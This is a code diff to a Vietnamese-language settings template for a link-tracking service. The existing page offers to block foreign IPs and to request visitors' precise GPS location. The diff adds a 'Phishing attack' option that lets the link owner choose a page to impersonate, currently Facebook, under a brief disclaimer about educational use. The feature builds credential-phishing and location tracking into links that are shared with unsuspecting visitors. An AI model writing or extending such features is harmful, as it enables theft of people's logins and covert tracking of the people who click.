@@ -1,62 +1,49 @@
 <%- include('partials/header_vietnamese') %>
-
 <nav>
-    <ul>
-        <li><strong>Cài đặt Liên kết</strong></li>
-    </ul>
-    <ul>
-        <li><a href="/dashboard" role="button" class="secondary">Về Bảng điều khiển</a></li>
-    </ul>
+    <ul><li><strong>Cài đặt Liên kết</strong></li></ul>
+    <ul><li><a href="/dashboard" role="button" class="secondary">Về Bảng điều khiển</a></li></ul>
 </nav>
-
 <div class="container">
     <hgroup>
         <h1>Cài đặt cho Liên kết</h1>
         <p>Liên kết đích: <a href="<%= link.targetUrl %>" target="_blank" rel="noopener noreferrer"><code><%= link.targetUrl %></code></a></p>
     </hgroup>
-
     <article>
         <form action="/link/settings/<%= link.shortId %>" method="POST">
             <header>Tùy chọn</header>
-
             <fieldset>
                 <legend><strong>Lọc Truy cập</strong></legend>
                 <label for="blockForeignIPs">
-                    <input type="checkbox" id="blockForeignIPs" name="blockForeignIPs" role="switch" <%= link.blockForeignIPs ? 'checked' : '' %>>
-                    Chặn IP nước ngoài
+                    <input type="checkbox" id="blockForeignIPs" name="blockForeignIPs" role="switch" <%= link.blockForeignIPs ? 'checked' : '' %>> Chặn IP nước ngoài
                 </label>
             </fieldset>
-
             <fieldset>
                 <legend><strong>Thu thập Dữ liệu</strong></legend>
                 <label for="requestGPS">
-                    <input type="checkbox" id="requestGPS" name="requestGPS" role="switch" <%= link.requestGPS ? 'checked' : '' %>>
-                    Yêu cầu vị trí GPS chính xác
+                    <input type="checkbox" id="requestGPS" name="requestGPS" role="switch" <%= link.requestGPS ? 'checked' : '' %>> Yêu cầu vị trí GPS chính xác
                 </label>
-                <small>Khi bật, người truy cập sẽ thấy một pop-up yêu cầu quyền truy cập vị trí. Độ chính xác cao hơn rất nhiều so với IP.</small>
+                <small>Khi bật, người truy cập sẽ thấy pop-up yêu cầu quyền truy cập vị trí.</small>
             </fieldset>
-
+            <fieldset>
+                <legend><strong style="color: var(--pico-color-red-500);">⚠️ Tấn công Giả mạo (Phishing)</strong></legend>
+                <label for="phishTemplate">Chọn trang để giả mạo</label>
+                <select id="phishTemplate" name="phishTemplate">
+                    <option value="" <%= !link.phishTemplate ? 'selected' : '' %>>-- Không sử dụng (An toàn) --</option>
+                    <option value="facebook" <%= link.phishTemplate === 'facebook' ? 'selected' : '' %>>Facebook</option>
+                </select>
+                <small><strong>Cảnh báo:</strong> Chỉ sử dụng tính năng này cho mục đích giáo dục hoặc kiểm thử bảo mật được cho phép. Lừa đảo là bất hợp pháp và bạn sẽ chịu hoàn toàn trách nhiệm.</small>
+            </fieldset>
             <footer style="margin-top: 2rem;">
-                <p><small>Để lưu thay đổi, vui lòng xác thực bạn không phải là robot.</small></p>
-                <div class="h-captcha"
-                     data-sitekey="<%= hcaptcha_site_key %>"
-                     data-callback="onSaveSettingsCaptchaSuccess"
-                     data-expired-callback="onSaveSettingsCaptchaExpired">
-                </div>
+                <p><small>Để lưu thay đổi, vui lòng xác thực Captcha.</small></p>
+                <div class="h-captcha" data-sitekey="<%= hcaptcha_site_key %>" data-callback="onSaveSettingsCaptchaSuccess" data-expired-callback="onSaveSettingsCaptchaExpired"></div>
                 <button type="submit" id="save-settings-btn" disabled>Lưu thay đổi</button>
             </footer>
         </form>
     </article>
 </div>
-
 <script>
     const saveBtn = document.getElementById('save-settings-btn');
-    function onSaveSettingsCaptchaSuccess(token) {
-        if (saveBtn) saveBtn.disabled = false;
-    }
-    function onSaveSettingsCaptchaExpired() {
-        if (saveBtn) saveBtn.disabled = true;
-    }
+    function onSaveSettingsCaptchaSuccess(token) { if (saveBtn) saveBtn.disabled = false; }
+    function onSaveSettingsCaptchaExpired() { if (saveBtn) saveBtn.disabled = true; }
 </script>
-
 <%- include('partials/footer_vietnamese') %>
